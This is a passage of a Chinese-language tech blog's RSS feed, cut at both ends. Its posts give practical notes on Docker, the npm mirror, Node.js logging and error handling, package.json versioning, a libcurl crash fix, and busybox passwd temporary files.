<dt>配置行 <a href="#coderef-npm-config" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-npm-config');" onmouseout="CodeHighlightOff(this, 'coderef-npm-config');">24</a></dt><dd>使用taobao的npm源，提高速度；ubuntu docker 镜像默认的 /bin/sh 指向 dash，为 npm scripts 指定 shell 为 bash</dd>

<dt>配置行 <a href="#coderef-npm-logs" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-npm-logs');" onmouseout="CodeHighlightOff(this, 'coderef-npm-logs');">36</a></dt><dd>输出应用日志到控制台，避免命令退出导致容器停止</dd>
</dl>
</div>
</div>

<div id="outline-container-org2d6b673" class="outline-2">
<h2 id="org2d6b673">创建 <code>docker</code> 镜像</h2>
<div class="outline-text-2" id="text-org2d6b673">
<div class="org-src-container">
<pre class="src src-sh">sudo docker build -t <span style="color: #8abeb7;">'tangxinfa/upload-fiddle:0.0.1'</span> .
</pre>
</div>
</div>
</div>

<div id="outline-container-org3673b61" class="outline-2">
<h2 id="org3673b61">运行 <code>docker</code> 容器</h2>
<div class="outline-text-2" id="text-org3673b61">
<div class="org-src-container">
<pre class="src src-sh">sudo docker run -idt --name=<span style="color: #8abeb7;">'upload-fiddle'</span> -p 127.0.0.1:80:80 <span style="color: #8abeb7;">'tangxinfa/upload</span><span style="color: #8abeb7; text-decoration: underline;">-fiddle:0.0.1'</span>
</pre>
</div>

<p>
现在可以通过浏览器访问服务了：<a href="http://localhost/">http://localhost/</a>
</p>
</div>
</div>

<div id="outline-container-orga2c5aa8" class="outline-2">
<h2 id="orga2c5aa8">查看容器运行日志</h2>
<div class="outline-text-2" id="text-orga2c5aa8">
<div class="org-src-container">
<pre class="src src-sh">sudo docker logs upload-fiddle -f
</pre>
</div>
</div>
</div>

<div id="outline-container-orgac90a70" class="outline-2">
<h2 id="orgac90a70">打开 <code>docker</code> 容器终端查看进程运行状态</h2>
<div class="outline-text-2" id="text-orgac90a70">
<div class="org-src-container">
<pre class="src src-sh">sudo docker exec -ti upload-fiddle /bin/bash
npm run pm2 -- list
</pre>
</div>

<p>
直接 <code>exit</code> 退出终端不会停止容器。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用国内镜像加速npm]]></title>
            <link>/article/4f7f752856fd5185955c50cf52a0901f-npm.html</link>
            <guid>/article/4f7f752856fd5185955c50cf52a0901f-npm.html</guid>
            <pubDate>Wed, 16 Dec 2015 09:42:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
使用 <code>npm</code> 安装 <code>node.js</code> 包时会很慢，使用国内镜像可以提高速度。
</p>

<ul class="org-ul">
<li><p>
方式一
</p>

<div class="org-src-container">
<pre class="src src-sh">npm install --registry=https://registry.npm.taobao.org
</pre>
</div></li>

<li><p>
方式二
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">npm_config_registry</span>=https://registry.npm.taobao.org
npm install
</pre>
</div></li>

<li><p>
方式三
</p>

<div class="org-src-container">
<pre class="src src-sh">npm config set <span style="color: #f0c674;">registry</span>=https://registry.npm.taobao.org
npm install
</pre>
</div>

<p>
使用 <code>yarn</code>
</p>
<div class="org-src-container">
<pre class="src src-sh">yarn config set registry https://registry.npm.taobao.org
yarn install
</pre>
</div></li>
</ul>

<p>
最后再推荐一下 <a href="http://npm.taobao.org/">淘宝 NPM 镜像</a> ，不但有 <code>npm</code> 的镜像，还有 <a href="http://npm.taobao.org/mirrors/node">node.js镜像</a> ，以后安装 <code>node.js</code> 可以更方便了。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js写日志堵塞问题]]></title>
            <link>/article/node.js-519965e55fd75835585e95ee9898.html</link>
            <guid>/article/node.js-519965e55fd75835585e95ee9898.html</guid>
            <pubDate>Sat, 12 Dec 2015 12:19:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
今天遇到一起后台服务中断问题，原因是有一个服务写日志导致磁盘满，清掉日志释放磁盘空间后，服务无法自动恢复，此时有以下症状：
</p>

<ul class="org-ul">
<li><code>node.js</code> 进程内存占用超高（超过1G），CPU占用超高（接近100%）</li>

<li><p>
<a href="https://github.com/Unitech/pm2">pm2</a> 运行异常
</p>

<p>
<code>stop</code> 和 <code>delete</code> 操作会卡住， <code>start</code> 和 <code>restart</code> 操作失败。
</p>

<p>
后台有大量 <a href="https://github.com/Unitech/pm2">pm2</a> 进程，应该是 <code>crontab</code> 每分钟调用 <code>pm2 start</code> 确保服务拉起导致。
</p>

<p>
<code>killall -9 node</code> 及 <a href="https://github.com/Unitech/pm2">pm2</a> 仍然无法将服务恢复。
</p>

<p>
<code>pm2 kill</code> 也会卡住，最终通过 <code>kill -9</code> 干掉 <a href="https://github.com/Unitech/pm2">pm2</a> 的后台进程 <code>PM2 v0.14.3: God Daemon</code> 才把服务重新启动。
</p></li>
</ul>


<p>
一个小时后又出现险情，类似的症状，虽然没有严重到中断服务，但是 <a href="https://github.com/Unitech/pm2">pm2</a> 失控很让人揪心，服务开了两个实例，其中一个实例状态：
</p>

<pre class="example">
│ App name          │ id │ mode    │ pid │ status  │ restart │ uptime │ memory │ watching │
│ xxx.xxxxxxxxx.com │ 0  │ cluster │ N/A │ errored │ 2       │ 0      │ 0 B    │ disabled │
</pre>

<p>
执行 <code>pm2 delete 0</code> 也是挂住，最终还是通过 <code>kill -9</code> 干掉 <a href="https://github.com/Unitech/pm2">pm2</a> 的后台进程 <code>PM2 v0.14.3: God Daemon</code> 才把服务重新启动。
</p>

<p>
<code>top</code> 看到的进程状态：
</p>

<pre class="example">
 PID USER      PR  NI  VIRT  RES  SHR S %CPU   %MEM  TIME+   COMMAND           
1640 nobody    20   0  793m 149m 8468 R 105.5  0.9   0:34.74 node /usr/local  
1649 nobody    20   0  796m 152m 8472 R 103.6  1.0   0:34.78 node /usr/local  
</pre>

<p>
服务输出的日志量在每秒700行（每行不超过120个字符）左右，最终将日志级别调到 <code>error</code> ，几乎不再输出日志，方才将CPU占用降下来：
</p>

<pre class="example">
    PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM  TIME+    COMMAND           
3527 nobody       20   0  829m 185m 8476 R 62.3  1.2  30:41.12 node /usr/local
3537 nobody       20   0  825m 181m 8476 R 60.4  1.1  30:45.96 node /usr/local
</pre>


<p>
我使用的日志模块为 <a href="https://github.com/baryon/tracer">tracer</a> ，简单地通过 <code>tracer.console(options)</code> 实例化全局的日志对象，最终写日志调用的是 <code>console.log</code> 。
</p>

<p>
在上层，我使用 <a href="https://github.com/Unitech/pm2">pm2</a> 来做进程管理，使用以下参数启动我的服务：
</p>

<pre class="example">
pm2 -n xxx.xxxxxxxxx.com -l /usr/local/xxx.xxxxxxxxx.com/run.log --merge-logs start /usr/local/xxx.xxxxxxxxx.com/src/index.js -i 2
</pre>

<p>
通过 <code>pm2 describe xxx.xxxxxxxxx.com</code> 输出可以发现最终会写三个日志文件：
</p>

<pre class="example">
│ entire log path   │ /usr/local/xxx.xxxxxxxxx.com/run.log             │
│ error log path    │ /root/.pm2/logs/xxx.xxxxxxxxx.com-error.log      │
│ out log path      │ /root/.pm2/logs/xxx.xxxxxxxxx.com-out.log        │
</pre>

<p>
根据 <a href="https://nodejs.org/docs/latest-v0.12.x/api/console.html#console_console">console的文档</a> 中的描述：
</p>

<blockquote>
<p>
The console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).
</p>

<p>
如果输出目标为终端或文件时，console函数是同步的（避免程序过早退出导致丢消息），目标为管道时则为异步（避免长时间堵塞）。
</p>
</blockquote>

<p>
这个特性引起的问题我也在另一篇文章《 <a href="http://blog.kankanan.com/article/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html">process.exit导致的控制台输出不全</a> 》里有提及。
</p>

<p>
也就是说不出意外的话，我们的服务写日志是阻塞式的，每秒钟同步方式写700行日志到一块普通机械硬盘上， <code>node.js</code> 不卡死才怪，更何况这块硬盘上还在被其它服务频繁读写。
</p>

<p>
一个服务运行过程中不写日志文件是不可能的，在 <code>node.js</code> 写日志方面需要找到更优的方案。
</p>

<p>
但是在寻找更好的方案之前，我做了一个常识性的思考：
</p>

<blockquote>
<p>
将应用程序日志写到磁盘文件的模块，除非它丢弃日志，当磁盘写入无法跟上日志产生的速度，就要暂存到某个地方，它可能是本机的内存或连网的另一台机器。
</p>
</blockquote>

<p>
所以我最终要找的，不仅仅是一个异步写日志文件的模块，还要先减少磁盘写入量，或者日志不直接写到磁盘文件，而是发送到一个日志服务，如果日志是写在本地磁盘，最好能够做到磁盘满时不中断服务，这种情况下丢失日志也是可以接受的。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[package.json文件dependencies中的各种版本号形式]]></title>
            <link>/article/package.json-65874ef6-dependencies-4e2d7684540479cd7248672c53f75f625f0f.html</link>
            <guid>/article/package.json-65874ef6-dependencies-4e2d7684540479cd7248672c53f75f625f0f.html</guid>
            <pubDate>Thu, 10 Dec 2015 09:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
查看 <code>package.json</code> 文件时，往往会在 <code>dependencies</code> 下看到各种各样的版本号形式，示例如下：
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #8abeb7;">"dependencies"</span>: {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"async"</span>: <span style="color: #8abeb7;">"1.2.1"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"chokidar"</span>: <span style="color: #8abeb7;">"^1.0.0"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"vizion"</span>: <span style="color: #8abeb7;">"latest"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"babel"</span>: <span style="color: #8abeb7;">"^5.x"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"pm2-logs"</span>: <span style="color: #8abeb7;">"~0.1.1"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"ikt"</span>: <span style="color: #8abeb7;">"git+http://ikt.pm2.io/ikt.git#master"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"punt"</span>: <span style="color: #8abeb7;">"*"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"express"</span>: <span style="color: #8abeb7;">"&gt;=3.0.0"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"connect"</span>: <span style="color: #8abeb7;">"1.30.2 - 2.30.2"</span>,
}
</pre>
</div>

<p>
一般自已写 <code>package.json</code> 时，图省事版本号会用 <code>*</code> ，想想也是很危险的，指不定哪天依赖的包不再向后兼容，程序运行估计就有问题了。
</p>

<p>
版本号形式是有据可循的，它就是《<a href="http://semver.org/lang/zh-CN/">语义化版本 2.0.0</a>》， <code>npm</code> 遵循该规范，但做了以下扩展：
</p>

<blockquote>
<p>
版本号的构建号部分允许使用 <code>-</code> 字符，所以 <code>0.2.0-1</code> 在《<a href="http://semver.org/lang/zh-CN/">语义化版本 2.0.0</a>》中是非法的，却是合法的 npm 语义版本（Semantic Versioning）。
</p>
</blockquote>

<p>
<code>npm</code> 使用 <a href="https://github.com/npm/node-semver">semver</a> 包进行版本号解析。
</p>

<div id="outline-container-orge165d7d" class="outline-2">
<h2 id="orge165d7d">版本号解析示例</h2>
<div class="outline-text-2" id="text-orge165d7d">
<p>
这篇文章《<a href="http://deadhorse.me/nodejs/2014/04/27/semver-in-nodejs.html">node.js 中的版本管理</a>》对常见的版本号风格进行了解释，虽然对 <code>^</code> 前缀解析不清，但还是值得一看，同时了提供了使用建议。
</p>

<p>
版本号格式： <code>主版本号.次版本号.修订号</code>
</p>

<dl class="org-dl">
<dt>1.2.1</dt><dd>匹配指定版本，这里是匹配1.2.1。</dd>

<dt>^1.0.0</dt><dd><p>
匹配 &gt;=1.0.0 且 &lt;2.0.0的版本。
</p>

<p>
<code>^</code> 前缀意为 <code>与指定的版本兼容</code> 。
</p>

<p>
<code>^</code> 前缀表示最左边的非0段不允许改变，该段之后的段可以为更高版，所以
</p>

<p>
^1.1.0 匹配 &gt;=1.1.0 且 &lt;2.0.0
</p>

<p>
^0.0.3 匹配 &gt;=0.0.3 且 &lt;0.0.4
</p></dd>

<dt>latest</dt><dd><p>
当前发布版本。
</p>

<p>
这是一个标记（tag，详见 <a href="https://docs.npmjs.com/cli/dist-tag">dist-tag | npm Documentation</a>），默认情况下 <code>npm install</code> 安装的就是这个 <code>latest</code> 标记。
常见的标记还有 <code>next</code> <code>stable</code> <code>beta</code> <code>canary</code> 。
</p></dd>

<dt>^5.x</dt><dd><p>
匹配 &gt;=5.0.0 且 &lt;6.0.0。
</p>

<p>
<code>X</code>, <code>x</code> 及 <code>*</code> 为通配符，版本号尾部省略的段等同于通配符，所以
</p>

<ul class="org-ul">
<li>匹配 &gt;=0.0.0</li>
</ul>

<p>
1   匹配 &gt;=1.0.0 且 &lt;2.0.0
</p>

<p>
1.2 匹配 &gt;=1.2.0 且 &lt;1.3.0
</p></dd>

<dt>~0.1.1</dt><dd><p>
匹配 &gt;=0.1.1 且 &lt;0.2.0。
</p>

<p>
<code>~</code> 前缀意为 <code>约等于版本</code>
</p>

<p>
如果存在次版本号，则允许修订号为更高版，否则允许次版本号为更高版。
</p>

<p>
~1 匹配 &gt;=1.0.0 且 &lt;2.0.0
</p></dd>

<dt>*</dt><dd>匹配 &gt;=0.0.0</dd>

<dt>&gt;=3.0.0</dt><dd><p>
同字面意义 &gt;=3.0.0。
</p>

<p>
其它操作符有 &lt; &lt;= &gt; &gt;= = ，多个表达式之间用 空格 分隔表示并集，用 || 分隔交集。
</p></dd>

<dt>1.30.2 - 2.30.2</dt><dd><p>
匹配 &gt;=1.30.2 且 &lt;=2.30.2
</p>

<p>
尾部缺失的节被替换为0再进行比较，如：1.30 - 2.30.2 同 1.30.0 - 2.30.2。
</p></dd>

<dt>git+<a href="http://ikt.pm2.io/ikt.git#master">http://ikt.pm2.io/ikt.git#master</a></dt><dd><p>
Git URL形式的依赖
</p>

<p>
还支持URL、GitHub URL、本地 URL，详见 <a href="https://docs.npmjs.com/files/package.json#urls-as-dependencies">URLs as Dependencies</a>
</p></dd>
</dl>
</div>
</div>

<div id="outline-container-org0536876" class="outline-2">
<h2 id="org0536876">参考</h2>
<div class="outline-text-2" id="text-org0536876">
<ul class="org-ul">
<li><a href="https://docs.npmjs.com/files/package.json">package.json | npm Documentation</a></li>

<li><a href="http://blog.nodejitsu.com/package-dependencies-done-right/">Package.json dependencies done right | Nodejitsu Inc.</a></li>

<li><a href="http://deadhorse.me/nodejs/2014/04/27/semver-in-nodejs.html">node.js 中的版本管理</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下安装运行docker]]></title>
            <link>/article/archlinux-4e0b5b8988c58fd0884c-docker.html</link>
            <guid>/article/archlinux-4e0b5b8988c58fd0884c-docker.html</guid>
            <pubDate>Wed, 09 Dec 2015 15:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
安装 <code>docker</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S docker
</pre>
</div></li>

<li><p>
配置 <code>docker</code>
</p>

<p>
由于 <code>docker</code> 的官方仓库被墙，需要从 <code>dockerpool.com</code> 上下载，修改 <code>docker</code> 配置以免 <code>pull</code> 时出现 tls 相关错误。
</p>

<p>
修改 <code>/usr/lib/systemd/system/docker.service</code> 文件，将
</p>

<pre class="example">
ExecStart=/usr/bin/docker daemon -H fd:// --exec-opt native.cgroupdriver=cgroupfs
</pre>

<p>
改为
</p>

<pre class="example">
ExecStart=/usr/bin/docker daemon --insecure-registry dl.dockerpool.com:5000 -H fd:// --exec-opt native.cgroupdriver=cgroupfs
</pre>

<p>
生效配置：
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo systemctl daemon-reload
</pre>
</div></li>

<li><p>
启动 <code>docker</code> 服务
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo systemctl restart docker
</pre>
</div></li>

<li><p>
下载 <code>ubuntu14.04</code> 镜像
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo docker pull <span style="color: #8abeb7;">'dl.dockerpool.com:5000/ubuntu:14.04'</span>
</pre>
</div></li>

<li><p>
试运行容器
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo docker run -t -i <span style="color: #8abeb7;">'dl.dockerpool.com:5000/ubuntu:14.04'</span> /bin/bash
</pre>
</div></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[修复libcurl域名解析超时引起的内存越界问题]]></title>
            <link>/article/4fee590d-libcurl-57df540d89e367908d8565f65f158d77768451855b588d8a754c95ee9898.html</link>
            <guid>/article/4fee590d-libcurl-57df540d89e367908d8565f65f158d77768451855b588d8a754c95ee9898.html</guid>
            <pubDate>Wed, 09 Dec 2015 06:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
程序发布后在一个用户的机器上频繁出现崩溃，最终定位到崩溃来自一个断言失败：
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #de935f;">assert</span>(<span style="color: #81a2be;">pthread_self</span>() != main_thread_id);
</pre>
</div>

<p>
上面这条语句出现在工作线程回调的函数中，竟然发生了工作线程ID和主线程ID相同的怪事，
观察了运行日志，发现使用libcurl发起HTTP请求如果超时则有很大机率会断言失败导致崩溃，
在使用libcurl发起HTTP请求的代码块前后输出工作线程ID，工作线程ID出现了变化，
根据经验很可能是出现了内存越界。
</p>

<p>
最终找到了几篇 <code>libcurl</code> 多线程安全相关的文章：
</p>

<ul class="org-ul">
<li>《<a href="http://blog.csdn.net/balderfan/article/details/7599554">libcurl 多线程使用注意事项</a>》</li>

<li>《<a href="http://blog.csdn.net/delphiwcdj/article/details/18284429">Libcurl多线程crash问题</a>》</li>
</ul>

<p>
修复步骤总结如下：
</p>

<ul class="org-ul">
<li><p>
在主线程起始处初始化 <code>libcurl</code> 库
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #de935f;">curl_global_init</span>(<span style="color: #81a2be;">CURL_GLOBAL_ALL</span>);
</pre>
</div></li>

<li><p>
禁止 <code>libcurl</code> 通过 <code>alarm</code> 实现域名解析超时
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #de935f;">curl_easy_setopt</span>(<span style="color: #81a2be;">curl</span>, <span style="color: #81a2be;">CURLOPT_NOSIGNAL</span>, 1L);
</pre>
</div>

<p>
如果不做下面的最后一步， <code>libcurl</code> 上设置的超时都会无效。
</p></li>

<li><p>
编译 <code>libcurl</code> 时启用 <code>c-ares</code> 或 <code>threaded resolver</code> ，以支持域名解析超时
</p>

<div class="org-src-container">
<pre class="src src-sh">./configure --enable-ares
</pre>
</div>

<p>
或
</p>

<div class="org-src-container">
<pre class="src src-sh">./configure --enable-threaded-resolver
</pre>
</div>

<p>
《<a href="http://daniel.haxx.se/blog/2011/04/25/libcurls-name-resolving/">Asynch resolving in libcurl</a>》对 <code>c-ares</code> 或 <code>threaded resolver</code> 两种方式进行了比较，简而言之：
</p>

<ul class="org-ul">
<li><code>c-ares</code> 是一个异步的域名解析库，开销更少，但是它并非使用系统原生的方式实现，对于定制系统（如：hosts或resolv.conf不在标准位置）可能会有问题。</li>

<li><code>threaded resolver</code> 每次域名解析都会开一个线程，解析完成后销毁线程，开销会大一些，但是稳定性、兼容性更好。</li>
</ul></li>
</ul>

<p>
按照上面的步骤启用 <code>c-ares</code> 进行修改后程序运行了一整天，没有再崩溃。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[/etc/passwd、/etc/passwd+、/etc/passwd- 文件介绍]]></title>
            <link>/article/etc-passwd-3001-etc-passwd-3001-etc-passwd-65874ef64ecb7ecd.html</link>
            <guid>/article/etc-passwd-3001-etc-passwd-3001-etc-passwd-65874ef64ecb7ecd.html</guid>
            <pubDate>Tue, 24 Nov 2015 07:58:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
busybox下修改密码或创建用户的时候，有时候操作会失败，此时 <code>/etc</code> 目录可能出现 <code>passwd+</code> 、 <code>passwd-</code> 两个文件。
</p>

<p>
当出现 <code>/etc/passwd+</code> 文件时，修改密码会耗时几秒钟然后报错：
</p>

<pre class="example">
# passwd root
Changing password for root
New password: 123456

Retype password: 123456

passwd: can't create '/etc/passwd+': File exists
passwd: can't update password file /etc/passwd
# 
</pre>

<div id="outline-container-org628c101" class="outline-2">
<h2 id="org628c101">根据 <a href="https://svn.mcs.anl.gov/repos/ZeptoOS/trunk/BGP/packages/busybox/src/libbb/update_passwd.c">update_passwd.c</a> 可以获得以下信息</h2>
<div class="outline-text-2" id="text-org628c101">
<ul class="org-ul">
<li><code>/etc/passwd</code> 用户帐号配置文件</li>

<li><code>/etc/passwd+</code> 更新过程中的临时文件</li>

<li><code>/etc/passwd-</code> 用户帐号配置文件的备份</li>
</ul>

<p>
更新密码逻辑：
</p>

<ul class="org-ul">
<li><p>
创建 <code>/etc/passwd+</code> 文件
</p>

<p>
如果 <code>/etc/passwd+</code> 文件存在，则会返回错误.
</p></li>

<li>备份 <code>/etc/passwd</code> 文件到 <code>/etc/passwd-</code></li>

<li>更新后的帐号配置写到 <code>/etc/passwd+</code> 文件</li>

<li>将 <code>/etc/passwd+</code> 文件重命名为 <code>/etc/passwd</code></li>
</ul>
</div>
</div>

<div id="outline-container-orgd1b2010" class="outline-2">
<h2 id="orgd1b2010">经验法则</h2>
<div class="outline-text-2" id="text-orgd1b2010">
<ul class="org-ul">
<li><code>/etc/passwd</code> 文件损坏时，使用备份文件 <code>/etc/passwd-</code> 还原</li>

<li><code>/etc/passwd+</code> 文件存在导致无法更新帐号信息，直接删除 <code>/etc/passwd+</code> 文件即可</li>

<li>还会存在 <code>/etc/shadow</code> <code>/etc/shadow-</code> <code>/etc/shadow+</code> ，也是同样处理</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js应用错误处理]]></title>
            <link>/article/node.js-5e94752895198bef59047406.html</link>
            <guid>/article/node.js-5e94752895198bef59047406.html</guid>
            <pubDate>Fri, 30 Oct 2015 10:08:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
先看一个简单的示例：
</p>

<div class="org-src-container">
<pre class="src src-js">app.post(<span style="color: #8abeb7;">'/products'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">req</span>, <span style="color: #f0c674;">res</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   service.add(req.body, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   logger.error(err.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   res.statusCode = 500;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> res.end({error: err.message});
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   res.statusCode = 200;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   res.end();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}};
</pre>
</div>

<p>
上面的代码能够直接用于产品环境吗？
</p>

<p>
对于稍微严谨的产品，答案肯定是 <span class="underline">否</span> 。
</p>

<p>
针对 service.add 调用失败提两个疑问：
</p>

<ul class="org-ul">
<li>如何根据错误类型给客户端返回不同的响应，以便客户端更人性化（而非简单的弹消息框）？</li>

<li>err.message 会不会包含不应该给用户看到的信息？</li>
</ul>

<p>
我们需要规范化错误类型，进行明确的分类标识，直到最外层的代码能够根据错误对象提供的信息，给客户端返回恰当的响应，
下面是我能想到的一些基本原则：
</p>

<ul class="org-ul">
<li><p>
错误对象拥有统一的接口
</p>

<p>
确保错误对象是一个Error类实例，如需要自定义错误类型，从Error类继承。
</p></li>

<li><p>
对错误进行命名标识
</p>

<p>
重量级的做法：为每一个错误类型自定义一个错误类。
轻量级的做法：将Error对象的name属性设置为错误类型标识。
</p></li>

<li><p>
在恰当的层次将底层Error对象转化为自定义的错误对象
</p>

<p>
对底层返回的原始错误，尽可能在调用栈恰当的层次转化为合适应用层错误对象，但不必强制对所有底层错误进行转换，
原生的Error对象可以认为是未标识的错误，这种错误可以默认处理（如：给客户端返回HTTP 500错误）。
</p></li>
</ul>

<p>
错误进行分类标识后的使用示例：
</p>

<div class="org-src-container">
<pre class="src src-js">app.post(<span style="color: #8abeb7;">'/products'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">req</span>, <span style="color: #f0c674;">res</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   service.add(req.body, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   logger.error(err.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err.name === <span style="color: #8abeb7;">'ProductAlreadyExists'</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   res.statusCode = 400;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   err.message = <span style="color: #8abeb7;">'&#20869;&#37096;&#38169;&#35823;'</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   res.statusCode = 500;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> res.end({error: err.message});
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   res.statusCode = 200;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   res.end();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}};
</pre>
</div>

<p>
优雅的错误处理是系统可维护性的重要组成部分，它和代码各部分息息相关，系统成型后很难再引入错误处理，设计系统时应该一开始就将它纳入考虑范围。
</p>

<div id="outline-container-org8056a2d" class="outline-2">
<h2 id="org8056a2d">参考</h2>
<div class="outline-text-2" id="text-org8056a2d">
<ul class="org-ul">
<li><p>
《<a href="https://www.joyent.com/developers/node/design/errors">Error Handling in Nodejs - Developer Center - Joyent</a>》
</p>

<p>
来自Joyent的Node.js错误处理最佳实践
</p></li>

<li><p>
《<a href="https://cnodejs.org/topic/52090bc944e76d216af25f6f">Node.js下自定义错误类型 - CNode</a>》
</p>

<p>
派生Error类注意事项
</p></li>

<li><p>
《<a href="https://docs.nodejitsu.com/articles/errors/what-is-the-error-object">What is the error object? - docs.nodejitsu.com</a>》
</p>

<p>
Error对象详解
</p></li>

<li><p>
《<a href="http://www.bennadel.com/blog/2828-creating-custom-error-objects-in-node-js-with-error-capturestacktrace.htm">Creating Custom Error Objects In Node.js With Error.captureStackTrace()</a>》
</p>

<p>
直接可用的自定义Error类方案
</p></li>

<li><p>
<a href="https://github.com/jayyvis/extend-error">extend-error</a>
</p>

<p>
用于扩展Error类的node.js模块
</p></li>

<li><p>
<a href="https://github.com/davepacheco/node-verror">node-verror</a>
</p>

<p>
包裹原始Error对象，并且保证可访问性的node.js模块，Joyent的Node.js错误处理最佳实践中进行了推荐
</p></li>

<li><p>
《<a href="https://github.com/davepacheco/node-verror/issues/15">Support for custom error types? · Issue #15 · davepacheco/node-verror</a>》
</p>

<p>
